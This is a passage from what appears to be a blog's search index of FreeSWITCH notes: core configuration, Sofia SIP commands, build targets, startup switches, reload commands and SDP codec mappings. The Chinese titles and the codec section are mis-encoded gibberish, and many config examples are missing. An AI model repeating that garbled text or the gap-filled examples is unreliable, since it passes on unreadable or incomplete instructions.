bindings Function keys can be mapped to API commands using the following configuration:The default keybindings are;F1 = helpF2 = statusF3 = show channelsF4 = show callsF5 = sofia statusF6 = reloadxmlF7 = console loglevel 0F8 = console loglevel 7F9 = sofia status profile internalF10 = sofia profile internal siptrace onF11 = sofia profile internal siptrace offF12 = versionBeware that the option loglevel is actually setting the minimum hard_log_Level in the application. What this means is if you set this to something other than DEBUG no matter what log level you set the console to one you start up you will not be able to get any log messages below the level you set. Also be careful of mis-typing a log level, if the log level is not correct it will default to a hard_log_level of 0. This means that virtually no log messages will show up anywhere. Core parameters core-db-dsn Allows to use ODBC database instead of sqlite3 for freeswitch core.Syntaxdsn:user:pass max-db-handlesMaximum number of simultaneous DB handles open db-handle-timeout Maximum number of seconds to wait for a new DB handle before failing disable-monotonic-timing (bool) disables monotonic timer/clock support if it is broken on your system. enable-use-system-time Enables FreeSWITCH to use system time. initial-event-threads Number of event dispatch threads to allocate in the core. Default is 1.If you see the WARNING \u0026ldquo;Create additional event dispatch thread\u0026rdquo; on a heavily loaded server, you could increase the number of threads to prevent the system from falling behind. loglevel amount of detail to show in log max-sessions limits the total number of concurrent channels on your FreeSWITCHâ„¢ system. sessions-per-second throttling mechanism, the switch will only create this many channels at most, per second. rtp-start-port RTP port range begin rtp-end-port RTP port range end Variables Variables are default channel variables set on each channel automatically.Â Example config ","permalink":"https://wdd.js.org/freeswitch/xml-config/","summary":"The FreeSWITCH core configuration is contained inÂ autoload_configs/switch.conf.xml\nDefault key bindings Function keys can be mapped to API commands using the following configuration:The default keybindings are;F1 = helpF2 = statusF3 = show channelsF4 = show callsF5 = sofia statusF6 = reloadxmlF7 = console loglevel 0F8 = console loglevel 7F9 = sofia status profile internalF10 = sofia profile internal siptrace onF11 = sofia profile internal siptrace offF12 = versionBeware that the option loglevel is actually setting the minimum hard_log_Level in the application.","title":"XML Switch Configuration"},{"content":"Sofia is a SIP stack used by FreeSWITCH.Â When you see \u0026ldquo;sofia\u0026rdquo; anywhere in your configuration, think \u0026ldquo;This is SIP stuff.\u0026rdquo; It takes a while to master it all, so please be patient with yourself. SIP is a crazy protocol and it will make you crazy too if you aren\u0026rsquo;t careful. Read on for information on setting up SIP/Sofia in your FreeSWITCH configuration.\nmod_sofia exposes the Sofia API and sets up the FreeSWITCH SIP endpoint. Endpoint A FreeSWITCH endpoint represents a full user agent and controls the signaling protocol and media streaming necessary to process calls. The endpoint is analogous to a physical VoIP telephone sitting on your desk. It speaks a particular protocolÂ such as SIP or Verto, to the outside world and interprets that for the FreeSWITCH core. Configuration Files sofia.conf.xml contains the configuration settings for mod_sofiaSee Sofia Configuration Files. SIP profiles SeeÂ SIP profilesÂ section inÂ Configuring FreeSWITCH.Â What if these commands don\u0026rsquo;t work for me? Make sure that you are not running another SIP server at the same time as FreeSWITCH. It is not always obvious that another SIP server is running. If you type in Sofia commands such as \u0026lsquo;sofia status profile default\u0026rsquo; and it doesn\u0026rsquo;t work then you may have another SIP server running. Stop the other SIP server and restart FreeSWITCH.On Linux, you may wish to try, as a superuser (often \u0026ldquo;root\u0026rdquo;):netstat -lunp | less# -l show listeners, -u show only UDP sockets,# -n numeric output (do not translate addresses or UDP port numbers)# -p show process information (PID, command). Only the superuser is allowed to see this infoWith the less search facility (usually the keystroke \u0026ldquo;/\u0026rdquo;), look forÂ :5060 which is the usual SIP port.To narrow the focus, you can use grep. In the example configs, port 5060 is the \u0026ldquo;internal\u0026rdquo; profile. Try this:netstat -lnp | grep 5060See if something other than FreeSWITCH is using port 5060. Sofia Recover sofia recoverYou can ask Sofia to recover calls that were up, after crashing (or other scenarios).Sofia recover can also be used, if your core db uses ODBC to achieve HA / failover.For FreeSWITCH HA configuration, see Freeswitch HA. Flushing and rebooting registered endpoints You can flush a registration or reboot specific registered endpoint by issuing a flush_inbound_reg command from the console.freeswitch\u0026gt; sofia profile \u0026lt;profile_name\u0026gt; flush_inbound_reg [\u0026lt;call_id\u0026gt;|user@host] [reboot]If you leave out \u0026lt;call_id\u0026gt; and/or user@host, you will flush/reboot every registered endpoint on a profile.\nNote: For polycom phone, the command causes the phone to check its configuration from the server. If the file is different (you may add extra space at the end of file), the phone will reboot. You should not change the value of voIpProt.SIP.specialEvent.checkSync.alwaysReboot=\u0026ldquo;0\u0026rdquo; to \u0026ldquo;1\u0026rdquo; in sip.cfg as that allows potential a DOS attack on the phone. You can also use the check_sync command:sofia profile \u0026lt;profile_name\u0026gt; check_sync \u0026lt;call_id\u0026gt; | user@domain\nNote: The polycom phones do not reload -directory.xml configuration in response to either of these commands, they only reload the configuration. If you want new speed dials to take effect, you\u0026rsquo;ll need to do a full reboot of the phone or enable the alwaysReboot option. (Suggestions from anyone with more detailed PolyCom knowledge would be appreciated here.) Starting a new profile If you have created a new profile you need to start it from the console:freeswitch\u0026gt; sofia profile \u0026lt;new_profile_name\u0026gt; start Reloading profiles and gateways You can reload a specific SIP profile by issuing a rescan/restart command from the consolefreeswitch\u0026gt; sofia profile \u0026lt;profile_name\u0026gt; [|] reloadxmlThe difference between rescan and restart is that rescan will just load new config and not stop FreeSWITCH from processing any more calls on a profile.** Some config options like IP address and (UDP) port are not reloaded with rescan.** Deleting gateways You can delete a specific gateway by issuing a killgw command from the console. If you use all as gateway name, all gateways will be killedfreeswitch\u0026gt; sofia profile \u0026lt;profile_name\u0026gt; killgw \u0026lt;gateway_name\u0026gt; Restarting gateways You can force a gateway to restart ( good for forcing a re-registration or similar ) by issuing a killgw command from the console followed by a profile rescan. This is safe to perform on a profile that has active calls.freeswitch\u0026gt; sofia profile \u0026lt;profile_name\u0026gt; killgw \u0026lt;gateway_name\u0026gt;freeswitch\u0026gt; sofia profile \u0026lt;profile_name\u0026gt; rescan Adding / Changing Existing Gateways It will be assumed that you have all your gateways in the /usr/local/freeswitch/conf/sip_profiles/external directory and that you have just created a new entry. You can add a new gateway to FreeSWITCH by issuing a rescan reloadxml command from the console as seen in the example below. This will load the newly created gateway and not affect any calls that are currently up.freeswitch\u0026gt; sofia profile external rescan reloadxml\nYou now realize that you have screwed up the IP address in the new gateway and need to change it. So you edit your gateway file and make any changes that you want. You will then need to issue the following commands to destroy the gateway, and then have FreeSWITCH reload the changes with affecting any existing calls that are currently up.\nfreeswitch\u0026gt; sofia profile external killgw \u0026lt;gateway_name\u0026gt;freeswitch\u0026gt; sofia profile external rescan reloadxml View SIP Registrations You can view all the devices that have registered by running the following from the console.freeswitch\u0026gt; sofia status profile regfreeswitch\u0026gt; sofia status profile default regfreeswitch\u0026gt; sofia status profile outbound regYou can also use the xmlstatus key to retrieve statuses in XML format. This is specially useful if you are using mod_xml_rpc.Commands are as follows:freeswitch\u0026gt; sofia xmlstatus profile regfreeswitch\u0026gt; sofia xmlstatus profile default regfreeswitch\u0026gt; sofia xmlstatus profile outbound reg List the status of gateways For the gateways that are in-service:freeswitch\u0026gt; sofia profile gwlist upFor the gateways that are out-of-service:freeswitch\u0026gt; sofia profile gwlist downNotes:\nIt should be used together with . See Sofia_Configuration_Files It can also be used to feed into mod distributor to exclude dead gateways. List gateway data To retrieve the value of an inbound variable:sofia_gateway_data \u0026lt;gateway_name\u0026gt; ivar To retrieve the value of an outbound variable:sofia_gateway_data \u0026lt;gateway_name\u0026gt; ovar To retrieve the value of either use:sofia_gateway_data \u0026lt;gateway_name\u0026gt; var This first checks for an inbound variable, then checks for an outbound variable if there\u0026rsquo;s no matching inbound. View User Presence Data Displays presence data from registered devices as seen by the serverUsage:sofia_presence_data [list|status|rpid|user_agent] [profile/]@domainsofia_presence_data list */2005status|rpid|user_agent|network_ip|network_portAway|away|Bria 3 release 3.5.1 stamp 69738|192.168.20.150|21368+OK\nIts possible to retrieve only one valuesofia_presence_data status */2005Away\nYou can use this value in the dialplan, e.g. Debugging Sofia-SIP The Sofia-SIP components can output various debugging information. The detail of the debugging output is determined by the debugging level. The level is usually module-specific and it can be modified by module-specific environment variable. There is also a default level for all modules, controlled by environment variable #SOFIA_DEBUG.The environment variables controlling the logging and other debug output are as follows:- #SOFIA_DEBUG Default debug level (0..9)- #NUA_DEBUG User Agent engine (nua) debug level (0..9)- #SOA_DEBUG SDP Offer/Answer engine (soa) debug level (0..9)- #NEA_DEBUG Event engine (nea) debug level (0..9)- #IPTSEC_DEBUG HTTP/SIP authentication module debug level (0..9)- #NTA_DEBUG Transaction engine debug level (0..9)- #TPORT_DEBUG Transport event debug level (0..9)- #TPORT_LOG If set, print out all parsed SIP messages on transport layer- #TPORT_DUMP Filename for dumping unparsed messages from transport- #SU_DEBUG su module debug level (0..9)The defined debug output levels are:- 0 SU_DEBUG_0() - fatal errors, panic- 1 SU_DEBUG_1() - critical errors, minimal progress at subsystem level- 2 SU_DEBUG_2() - non-critical errors- 3 SU_DEBUG_3() - warnings, progress messages- 5 SU_DEBUG_5() - signaling protocol actions (incoming packets, \u0026hellip;)- 7 SU_DEBUG_7() - media protocol actions (incoming packets, \u0026hellip;)- 9 SU_DEBUG_9() - entering/exiting functions, very verbatim progressStarting with 1.0.4, those parameters can be controlled from the console by doingfreeswitch\u0026gt; sofia loglevel \u0026lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun\u0026gt; [0-9]\u0026ldquo;all\u0026rdquo; Will change every component\u0026rsquo;s loglevelA log level of 0 turns off debugging, to turn them all off, you can dofreeswitch\u0026gt; sofia loglevel all 0To report a bug, you can turn on debugging with more verbosesofia global siptrace onsofia loglevel all 9sofia tracelevel alertconsole loglevel debugfsctl debug_level 10 Debugging presence and SLA As of Jan 14, 2011, sofia supports a new debugging command: sofia global debug. It can turn on debugging for SLA, presence, or both. Usage is:sofia global debug slasofia global debug presencesofia global debug noneThe first two enable debugging SLA and presence, respectively. The third one turns off SLA and/or presence debugging. Sample Export (Linux/Unix) Alternatively, the levels can also be read from environment variables. The following bash commands turn on all debugging levels, and is equivalent to \u0026ldquo;sofia loglevel all 9\u0026rdquo;export SOFIA_DEBUG=9export NUA_DEBUG=9export SOA_DEBUG=9export NEA_DEBUG=9export IPTSEC_DEBUG=9export NTA_DEBUG=9export TPORT_DEBUG=9export TPORT_LOG=9export TPORT_DUMP=/tmp/tport_sip.logexport SU_DEBUG=9To turn this debugging off again, you have to exit FreeSWITCH and type unset. For example:unset TPORT_LOG Sample Set (Windows) The following bash commands turn on all debugging levels.set SOFIA_DEBUG=9set NUA_DEBUG=9set SOA_DEBUG=9set NEA_DEBUG=9set IPTSEC_DEBUG=9set NTA_DEBUG=9set TPORT_DEBUG=9set TPORT_LOG=9set TPORT_DUMP=/tmp/tport_sip.logset SU_DEBUG=9To turn this debugging off again, you have to exit FreeSWITCH and type unset. For example:set TPORT_LOG=You can also control SIP Debug output within fs_cli, the FreeSWITCH client app.freeswitch\u0026gt; sofia profile siptrace on|offOn newer software release, you can now be able to issue siptrace for all profiles:sofia global siptrace [on|off]\nTo have the SIP Debug details put in the /usr/local/freeswitch/log/freeswitch.log file, usefreeswitch\u0026gt; sofia tracelevel info (or any other loglevel name or number)To have the SIP details put into the log file automatically on startup, add this to sofia.conf.xml:\u0026lt;global_settings\u0026gt;\u0026hellip;\u0026hellip;\u0026lt;/global_settings\u0026gt;\nand the following to the sip profile xml file:\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\nProfile Configurations Track Call ACL You can restrict access by IP address for either REGISTERs or INVITEs (or both) by using the following options in the sofia profile.See ACL for other access controlsSee acl.conf.xml for list configuration Disabling Hold Disable all calls on this profile from putting the call on hold:\nSee also: rtp_disable_hold variable Using A Single Domain For All Registrations You can force all registrations in a particular profile to use a single domain. In other words, you can ignore the domain in the SIP message. You will need to modify several sofia profile settings. challenge realm auto_from - uses the from field as the value for the SIP realm. auto_to - uses the to field as the value for the SIP realm. - you can input any value to use for the SIP realm. force-register-domain Preference Weight Transport Port Address================================================================================1 0.500 udp 5060 74.51.38.151 0.500 tcp 5060 74.51.38.15 Flushing Inbound Registrations From time to time, you may need to kill a registration.You can kill a registration from the CLI, or anywhere that accepts API commands with a command similar to the following:sofia profile \u0026lt;profile_name_here\u0026gt; flush_inbound_reg [optional_callid] Dial out of a gateway Basic form:sofia/gateway//\u0026lt;number_to_dial\u0026gt;Example 1:sofia/gateway/asterlink/18005551212gateway: is a keyword and not a \u0026ldquo;gateway\u0026rdquo; name. It has special meaning and tells the stack which credentials to use when challenged for the call. is the actual name of the gateway through which you want to send the call\nYour available gateways (usually configured in conf/sip_profiles/external/*.xml) will show up in sofia status:freeswitch#\u0026gt; sofia status\nName TypeÂ Data State=================================================================================================default profile sip:mod_sofia@2.3.4.5:5060 RUNNING (2)mygateway gatewayÂ sip:username@1.2.3.4 NOREGphonebooth.example.com alias default ALIASED=================================================================================================1 profile 1 alias Modifying the To: header You can override the To: header by appending ^.Example 1:sofia/foo/user%192.168.1.1^101@$${domain}\nSpecifying SIP Proxy With fs_path You can route a call through a specific SIP proxy by using the \u0026ldquo;fs_path\u0026rdquo; directive. Example:sofia/foo/user@that.domain;fs_path=sip:proxy.this.domain Safe SIP URI Formatting As of commit https://freeswitch.org/stash/projects/FS/repos/freeswitch/commits/76370f4d1767bb0dcf828a3d6cde6e015b2cfa03 the User part of the SIP URI has been \u0026ldquo;safely\u0026rdquo; encoded in the case where spaces or other special characters appear.\nChannel Variables Adding Request Headers You can add arbitrary headers to outbound SIP calls by prefixing the string \u0026lsquo;sip_h_\u0026rsquo; to any channel variable, for example:Note that for BYE requests, you will need to use the prefix \u0026lsquo;sip_bye_h_\u0026rsquo; on the channel variable.\nWhile not required, you should prefix your headers with \u0026ldquo;X-\u0026rdquo; to avoid issues with interoperability with other SIP stacks.All inbound SIP calls will install any X- headers into local variables.This means you can easily bridge any X- header from one FreeSWITCH instance to another.To access the header above on a 2nd box, use the channel variable ${sip_h_X-Answer}It is important to note that the syntax ${sip_h_custom-header} can\u0026rsquo;t be used to retrieve any custom header not starting with X-.It is because Sofia only reads and puts into variables custom headers starting with X-.\nAdding Response Headers There are three types of response header prefixes that can be set:\nResponse headersip_rh_ Provisional response headersip_ph_ Bye response headersip_bye_h_ Each prefix will exclusively add headers for their given types of requests - there is no \u0026ldquo;global\u0026rdquo; response header prefix that will add a header to all response messages.For example:\nAdding Custom Headers For instance, you may need P-Charge-Info to append to your INVITE header, you may do as follows:Then, you would see it in SIP message:INVITE sip:19099099099@1.2.3.4 SIP/2.0Via: SIP/2.0/UDP 5.6.7.8:5080;rport;branch=z9hG4bKyg61X9v3gUD4gMax-Forwards: 69From: \u0026ldquo;DJB\u0026rdquo; sip:2132132132@5.6.7.8;tag=XQKQ322vQF5gKTo: sip:19099099099@1.2.3.4Call-ID: b6c776f6-47ed-1230-0085-000f1f659e58CSeq: 30776798 INVITEContact: sip:mod_sofia@5.6.7.8:5080User-Agent: FreeSWITCH-mod_sofia/1.2.0-rc2+git~20120713T162602Z~0afd7318bd+unclean~20120713T184029ZAllow: INVITE, ACK, BYE, CANCEL, OPTIONS, MESSAGE, UPDATE, INFO, REGISTER, REFER, NOTIFYSupported: timer, precondition, path, replacesAllow-Events: talk, hold, conference, referContent-Type: application/sdpContent-Disposition: sessionContent-Length: 229P-Charge-Info: sip:2132132132@5.6.7.8;npi=0;noa=3X-FS-Support: update_display,send_info.Remote-Party-ID: \u0026ldquo;DJB\u0026rdquo; sip:2132132132@5.6.7.8;party=calling;screen=yes;privacy=off Strip Individual SIP Headers Sometimes a SIP provider will add extra header information. Most of the time they do that for their own use (tracking calls). But that extra information can cause a lot of problems. For example: I get a call from the PSTN via a DID provider (provider1). Since im not in the office the call gets bridged to my cell phone (provider2). Provider1 add\u0026rsquo;s extra information to the sip packet like displayed below:X-voipnow-did: 01234567890X-voipnow-extension: 987654321\u0026hellip;In some scenario, we bridge this call directly to provider2 the calls get dropped since provider2 doesnt accept the X-voipnow header, so we have to strip off those SIP headers.To strip them off, use the application UNSET in the dialplan (the inverse of SET):\u0026hellip; Strip All custom SIP Headers If you wish to strip all custom headers while keeping only those defined in dialplan:\u0026hellip; Additional Channel variables Additional variables may also be set to influence the way calls are handled by sofia.For example, contacts can be filtered by setting the \u0026lsquo;sip_exclude_contact\u0026rsquo; variable. Example:Or you can perform SIP Digest authorization on outgoing calls by setting sip_auth_username and sip_auth_password variables to avoid using Gateways to authenticate. Example:Changing the SIP Contact user FreeSWITCH normally uses mod_sofia@ip:port for the internal SIP contact. To change this to foo@ip:port, there is a variable, sip_contact_user:{sip_contact_user=foo}sofia/my_profile/1234@192.168.0.1;transport=tcp sip_renegotiate_codec_on_reinvite true|false sip_recovery_break_rfc true|false Transcoding Issues G729 and G723 will not let you transcode because of licensing issues. Calls will fail if for example originating endpoint has set G729 with higher priority and receiving endpoint has G723 with highest priority. The logic is to fail the call rather than attempt to find a codec match. If you are having issues due to transcoding you may disable transcoding and both endpoints will negotiate the compatible codec rather than just fail the call.disable-transcoding will take the preferred codec from the inbound leg of your call and only offer that codec on the outbound leg.Add the following command along with to your sofia profile\nExample:\nCustom Events The following are events that can be subscribed to via Event Socket\nRegistration sofia::register* sofia::pre_register* sofia::register_attempt* sofia::register_failure* sofia::unregister - explicit unregister calls* sofia::expire - when a user registration expires Gateways sofia::gateway_add* sofia::gateway_delete* sofia::gateway_state - when a gateway is detected as down or back up Call recovery sofia::recovery_send* sofia::recovery_recv* sofia::recovery_recovered Other sofia::notify_refer* sofia::reinvite* sofia::error FAQ Does it use UDP or TCP? By default it uses both, but you can addÂ ;transport=tcp to the Sofia URL to force it to use TCP.For example:sofia/profile/foo@bar.com;transport=tcpAlso there is a parameter in the gateway config:That will cause it to use the TCP transport for the registration and all subsequent SIP messages.Not sure if this is needed or what it does, but the following can also be used in gateway settings:\n","permalink":"https://wdd.js.org/freeswitch/sofia-stack/","summary":"Sofia is a SIP stack used by FreeSWITCH.Â When you see \u0026ldquo;sofia\u0026rdquo; anywhere in your configuration, think \u0026ldquo;This is SIP stuff.\u0026rdquo; It takes a while to master it all, so please be patient with yourself. SIP is a crazy protocol and it will make you crazy too if you aren\u0026rsquo;t careful. Read on for information on setting up SIP/Sofia in your FreeSWITCH configuration.\nmod_sofia exposes the Sofia API and sets up the FreeSWITCH SIP endpoint.","title":"Sofia SIP Stack"},{"content":" make clean - Cleans the build environment make current - Cleans build environment, performs an git update, then does a make install make core_install (or make install_core) - Recompiles and installs just the core files. Handy if you are working on a core file and want to recompile without doing the whole shebang. make mod_XXXX-install - Recompiles and installs just a single module. Here are some examples: make mod_openzap-install make mod_sofia-install make mod_lcr-install make samples - This will not replace your configuration. This will instead make the default extensions and dialplan to run the basic configuration of FreeSWITCH. ","permalink":"https://wdd.js.org/freeswitch/compile-fs/","summary":"make clean - Cleans the build environment make current - Cleans build environment, performs an git update, then does a make install make core_install (or make install_core) - Recompiles and installs just the core files. Handy if you are working on a core file and want to recompile without doing the whole shebang. make mod_XXXX-install - Recompiles and installs just a single module. Here are some examples: make mod_openzap-install make mod_sofia-install make mod_lcr-install make samples - This will not replace your configuration.","title":"ç¼–è¯‘FS"},{"content":"\nè¿è¡Œfs å‰å°è¿è¡Œ freeswitch åå°è¿è¡Œ freeswich -nc å‚æ•°åˆ—è¡¨ These are the optional arguments you can pass to freeswitch:\nFreeSWITCH startup switches\n-waste -- allow memory waste -no-auto-stack -- don\u0026#39;t adjust thread stack size -core -- dump cores -help -- print this message -version -- print the version and exit -rp -- enable high(realtime) priority settings -lp -- enable low priority settings -np -- enable normal priority settings (system default) -vg -- run under valgrind -nosql -- disable internal SQL scoreboard -heavy-timer -- Heavy Timer, possibly more accurate but at a cost -nonat -- disable auto NAT detection -nonatmap -- disable auto NAT port mapping -nocal -- disable clock calibration -nort -- disable clock clock_realtime -stop -- stop freeswitch -nc -- no console and run in background -ncwait -- no console and run in background, but wait until the system is ready before exiting (implies -nc) -c -- output to a console and stay in the foreground (default behavior) UNIX-like only -nf -- no forking -u [user] -- specify user to switch to -g [group] -- specify group to switch to -ncwait -- do not output to a console and background but wait until the system is ready before exiting (implies -nc) Windows-only -service [name] \u0026ndash; start freeswitch as a service, cannot be used if loaded as a console app-install [name] \u0026ndash; install freeswitch as a service, with optional service name-uninstall \u0026ndash; remove freeswitch as a service-monotonic-clock \u0026ndash; use monotonic clock as timer source\nFile locations -base [basedir] \u0026ndash; alternate prefix directory-conf [confdir] \u0026ndash; alternate directory for FreeSWITCH configuration files-log [logdir] \u0026ndash; alternate directory for logfiles-run [rundir] \u0026ndash; alternate directory for runtime files-db [dbdir] \u0026ndash; alternate directory for the internal database-mod [moddir] \u0026ndash; alternate directory for modules-htdocs [htdocsdir] \u0026ndash; alternate directory for htdocs-scripts [scriptsdir] \u0026ndash; alternate directory for scripts-temp [directory] \u0026ndash; alternate directory for temporary files-grammar [directory] \u0026ndash; alternate directory for grammar files-recordings [directory] \u0026ndash; alternate directory for recordings-storage [directory] \u0026ndash; alternate directory for voicemail storage-sounds [directory] \u0026ndash; alternate directory for sound filesIf you set the file locations of any one of -conf, -log, or -db you must set all three. File Paths A handy method to determine where FreeSWITCHâ„¢ is currently looking for files (in linux):Method for showing FS paths\nbash\u0026gt; fs_cli -x \u0026#39;global_getvar\u0026#39;| grep _dir base_dir=/usrrecordings_dir=/var/lib/freeswitch/recordingssounds_dir=/usr/share/freeswitch/soundsconf_dir=/etc/freeswitchlog_dir=/var/log/freeswitchrun_dir=/var/run/freeswitchdb_dir=/var/lib/freeswitch/dbmod_dir=/usr/lib/freeswitch/modhtdocs_dir=/usr/share/freeswitch/htdocsscript_dir=/usr/share/freeswitch/scriptstemp_dir=/tmpgrammar_dir=/usr/share/freeswitch/grammarfonts_dir=/usr/share/freeswitch/fontsimages_dir=/var/lib/freeswitch/imagescerts_dir=/etc/freeswitch/tlsstorage_dir=/var/lib/freeswitch/storagecache_dir=/var/cache/freeswitchdata_dir=/usr/share/freeswitchlocalstate_dir=/var/lib/freeswitchArgument CautionsSetting some arguments may affect behavior in unexpected ways. The following list contains known side-effects of setting various command line arguments.* nosql - Setting nosql completely disables the use of coreDB which means you will not have show channels, show calls, tab completion, or anything else that is stored in the coreDB.\n","permalink":"https://wdd.js.org/freeswitch/command-line/","summary":"è¿è¡Œfs å‰å°è¿è¡Œ freeswitch åå°è¿è¡Œ freeswich -nc å‚æ•°åˆ—è¡¨ These are the optional arguments you can pass to freeswitch:\nFreeSWITCH startup switches\n-waste -- allow memory waste -no-auto-stack -- don\u0026#39;t adjust thread stack size -core -- dump cores -help -- print this message -version -- print the version and exit -rp -- enable high(realtime) priority settings -lp -- enable low priority settings -np -- enable normal priority settings (system default) -vg -- run under valgrind -nosql -- disable internal SQL scoreboard -heavy-timer -- Heavy Timer, possibly more accurate but at a cost -nonat -- disable auto NAT detection -nonatmap -- disable auto NAT port mapping -nocal -- disable clock calibration -nort -- disable clock clock_realtime -stop -- stop freeswitch -nc -- no console and run in background -ncwait -- no console and run in background, but wait until the system is ready before exiting (implies -nc) -c -- output to a console and stay in the foreground (default behavior) UNIX-like only -nf -- no forking -u [user] -- specify user to switch to -g [group] -- specify group to switch to -ncwait -- do not output to a console and background but wait until the system is ready before exiting (implies -nc) Windows-only -service [name] \u0026ndash; start freeswitch as a service, cannot be used if loaded as a console app-install [name] \u0026ndash; install freeswitch as a service, with optional service name-uninstall \u0026ndash; remove freeswitch as a service-monotonic-clock \u0026ndash; use monotonic clock as timer source","title":"fs å‘½ä»¤è¡Œ"},{"content":" Item Reload Command Notes XML Dialplan reloadxml Run each time you edit XML dial file(s) ACLs reloadacl Edit acl.conf.xml first Voicemail reload mod_voicemail Edit voicemail.conf.xml first Conference reload mod_conference Edit conference.conf.xml first Add Sofia Gateway sofia profile rescan Less intrusive - no calls dropped Remove Sofia Gateway sofia profile killgw \u0026lt;gateway_name\u0026gt; Less intrusive - no calls dropped Restart Sofia Gateway sofia profile killgw \u0026lt;gateway_name\u0026gt;sofia profile rescan Less intrusive - no calls dropped Add/remove Sofia Gateway sofia profile restart More intrusive - all profile calls dropped Local Stream seeÂ Mod_local_stream Edit localstream.conf.xml first Update a lua file nothing necessary file is loaded from disk each time it is run Update LCR SQL table nothing necessary SQL query is run for each new call Update LCR options reload mod_lcr Edit lcr.conf.xml first Update CID Lookup Options reload mod_cidlookup Edit cidlookup.conf.xml first Update JSON CDR Options reload mod_json_cdr Edit json_cdr.conf.xml first Update XML CDR Options reload mod_xml_cdr Edit xml_cdr.conf.xml first Update XML CURL Server Response nothing, unless usingÂ cache ","permalink":"https://wdd.js.org/freeswitch/reload/","summary":"Item Reload Command Notes XML Dialplan reloadxml Run each time you edit XML dial file(s) ACLs reloadacl Edit acl.conf.xml first Voicemail reload mod_voicemail Edit voicemail.conf.xml first Conference reload mod_conference Edit conference.conf.xml first Add Sofia Gateway sofia profile rescan Less intrusive - no calls dropped Remove Sofia Gateway sofia profile killgw \u0026lt;gateway_name\u0026gt; Less intrusive - no calls dropped Restart Sofia Gateway sofia profile killgw \u0026lt;gateway_name\u0026gt;sofia profile rescan Less intrusive - no calls dropped Add/remove Sofia Gateway sofia profile restart More intrusive - all profile calls dropped Local Stream seeÂ Mod_local_stream Edit localstream.","title":"fs reloadå‘½ä»¤"},{"content":"v=0 o=WMSWMS 1562204406 1562204407 IN IP4 192.168.40.79 s=WMSWMS c=IN IP4 192.168.40.79 t=0 0 m=audio 31114 RTP/AVP 0 8 9 101 a=rtpmap:0 PCMU/8000 a=rtpmap:8 PCMA/8000 a=rtpmap:9 G722/8000 a=rtpmap:101 telephone-event/8000 a=fmtp:101 0-16 a=ptime:20 ä¸Šé¢çš„SDPåè®®ï¼Œæˆ‘ä»¬åªå…³æ³¨åª’ä½“ç¼–ç éƒ¨åˆ†ï¼Œå…¶ä¸­\nm=audio 31114 RTP/AVP 0 8 9 101 a=rtpmap:0 PCMU/8000 a=rtpmap:8 PCMA/8000 a=rtpmap:9 G722/8000 må­—æ®µaudioè¯´æ˜æ˜¯éŸ³é¢‘ 31114æ˜¯rtpçš„å‘é€ç«¯å£ï¼Œä¸€èˆ¬rtpç«¯å£éƒ½æ˜¯å¶æ•°ï¼Œå¶æ•°åé¢çš„ä¸€ä¸ªå¥‡æ•°ç«¯å£æ˜¯ç»™rtcpç«¯å£çš„ 0 8 9 101å°±æ˜¯åª’ä½“ç¼–ç ï¼Œæ¯ä¸ªæ•´æ•°ä»£è¡¨ä¸€ä¸ªç¼–ç ï¼Œå…¶ä¸­96ä»¥ä¸‹çš„æ˜¯éƒ½æ˜¯ç”¨IANAè§„å®šçš„ï¼Œå¯ä»¥ä¸ç”¨ä¸‹é¢çš„rtpmapå­—æ®µå»æŒ‡å®šï¼Œ96ä»¥ä¸Šçš„å±äºåŠ¨æ€ç¼–ç ï¼Œéœ€è¦ç”¨rtpmapå»æŒ‡å®š ä¸Šé¢æ˜¯æ•´ä¸ªç¼–ç è¡¨ï¼Œæˆ‘ä»¬åªéœ€è¦è®°ä½å‡ ä¸ªå°±å¯ä»¥:\n0 PCMU/8000 3 GSM/8000 8 PCMA/8000 9 G722/8000 18 G729/8000 102 DTMF/8000 a=rtpmap:101 telephone-event/8000a=fmtp:101 0-16ä¸Šé¢çš„å­—æ®µæè¿°çš„æ˜¯DTMPçš„æ”¯æŒã€‚DTMFæ ‡å‡†ï¼Œæ‰€æœ‰SIPå®ä½“è‡³å°‘æ”¯æŒ0-15çš„DTMFäº‹ä»¶ã€‚\n0-9æ˜¯æ•°å­— 10æ˜¯* 11æ˜¯# 12-15å¯¹åº”A,B,C,D å‚è€ƒ https://www.iana.org/assignments/rtp-parameters/rtp-parameters.xhtml https://www.3cx.com/blog/voip-howto/sdp-voip2/ https://www.3cx.com/blog/voip-howto/sdp-voip/ ","permalink":"https://wdd.js.org/opensips/ch4/codec-table/","summary":"v=0 o=WMSWMS 1562204406 1562204407 IN IP4 192.168.40.79 s=WMSWMS c=IN IP4 192.168.40.79 t=0 0 m=audio 31114 RTP/AVP 0 8 9 101 a=rtpmap:0 PCMU/8000 a=rtpmap:8 PCMA/8000 a=rtpmap:9 G722/8000 a=rtpmap:101 telephone-event/8000 a=fmtp:101 0-16 a=ptime:20 ä¸Šé¢çš„SDPåè®®ï¼Œæˆ‘ä»¬åªå…³æ³¨åª’ä½“ç¼–ç éƒ¨åˆ†ï¼Œå…¶ä¸­\nm=audio 31114 RTP/AVP 0 8 9 101 a=rtpmap:0 PCMU/8000 a=rtpmap:8 PCMA/8000 a=rtpmap:9 G722/8000 må­—æ®µaudioè¯´æ˜æ˜¯éŸ³é¢‘ 31114æ˜¯rtpçš„å‘é€ç«¯å£ï¼Œä¸€èˆ¬rtpç«¯å£éƒ½æ˜¯å¶æ•°ï¼Œå¶æ•°åé¢çš„ä¸€ä¸ªå¥‡æ•°ç«¯å£æ˜¯ç»™rtcpç«¯å£çš„ 0 8 9 101å°±æ˜¯åª’ä½“ç¼–ç ï¼Œæ¯ä¸ªæ•´æ•°ä»£è¡¨ä¸€ä¸ªç¼–ç ï¼Œå…¶ä¸­96ä»¥ä¸‹çš„æ˜¯éƒ½æ˜¯ç”¨IANAè§„å®šçš„ï¼Œå¯ä»¥ä¸ç”¨ä¸‹é¢çš„rtpmapå­—æ®µå»æŒ‡å®šï¼Œ96ä»¥ä¸Šçš„å±äºåŠ¨æ€ç¼–ç ï¼Œéœ€è¦ç”¨rtpmapå»æŒ‡å®š ä¸Šé¢æ˜¯æ•´ä¸ªç¼–ç è¡¨ï¼Œæˆ‘ä»¬åªéœ€è¦è®°ä½å‡ ä¸ªå°±å¯ä»¥:\n0 PCMU/8000 3 GSM/8000 8 PCMA/8000 9 G722/8000 18 G729/8000 102 DTMF/8000 a=rtpmap:101 telephone-event/8000a=fmtp:101 